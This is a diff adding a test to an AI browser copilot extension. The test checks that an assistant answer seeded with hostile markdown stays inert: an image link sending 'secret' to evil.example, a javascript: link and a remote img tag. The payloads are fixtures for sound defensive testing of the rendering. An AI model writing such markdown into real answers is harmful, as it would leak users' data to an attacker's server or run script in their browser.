@@ -147,3 +147,65 @@ test('model calls are counted per chat and shown in the header', async () => {
   assert.match(await badge.evaluate(el => el.innerText), /^\d+ tok$/);
   await finish(session);
 });
+
+test('an answer never loads an image or runs a script link, whatever the model wrote', async () => {
+  const session = await openSession(extension, mock);
+  const threadId = crypto.randomUUID();
+  const now = Date.now();
+  await session.panel.evaluate(
+    (threadId, now) =>
+      new Promise((resolve, reject) => {
+        const open = indexedDB.open('avi-copilot');
+        open.onerror = () => reject(open.error);
+        open.onsuccess = () => {
+          const tx = open.result.transaction(['threads', 'messages'], 'readwrite');
+          tx.objectStore('threads').put({
+            id: threadId,
+            title: 'Markdown check',
+            createdAt: now,
+            updatedAt: now,
+            model: null,
+            boundTabIds: [],
+            boundGroupId: null,
+            boundUrl: null,
+            status: 'idle',
+            error: null,
+            activity: '',
+            activeTask: null,
+            runStartedAt: null,
+            pendingRequest: null,
+            pinned: false,
+            archived: false,
+            tags: [],
+            memory: '',
+            memoryUpToSeq: 0,
+            forkedFrom: null,
+            meetingId: null,
+          });
+          const message = (seq, actor, content) =>
+            tx.objectStore('messages').put({ id: `${threadId}-${seq}`, threadId, seq, actor, content, ts: now + seq });
+          message(1, 'user', 'Summarize the page');
+          message(
+            2,
+            'planner',
+            'Done. ![x](https://evil.example/?d=secret) [click](javascript:alert(1)) <img src="https://evil.example/h"> [source](https://example.com/page)',
+          );
+          tx.oncomplete = () => resolve();
+          tx.onerror = () => reject(tx.error);
+        };
+      }),
+    threadId,
+    now,
+  );
+  await session.panel.goto(`${extension.origin}/sidepanel.html?thread=${threadId}`);
+  await session.panel.waitForFunction(() => document.body.innerText.includes('Done.'), { polling: 300 });
+  const found = await session.panel.evaluate(() => ({
+    images: document.querySelectorAll('img[src*="evil"], picture, iframe').length,
+    evil: document.body.innerHTML.includes('evil.example'),
+    script: [...document.querySelectorAll('a')].some(a => a.getAttribute('href')?.startsWith('javascript')),
+    // A safe link stays, as a button that asks before it opens
+    link: [...document.querySelectorAll('[data-streamdown="link"]')].some(link => link.textContent === 'source'),
+  }));
+  assert.deepEqual(found, { images: 0, evil: false, script: false, link: true });
+  await session.close();
+});
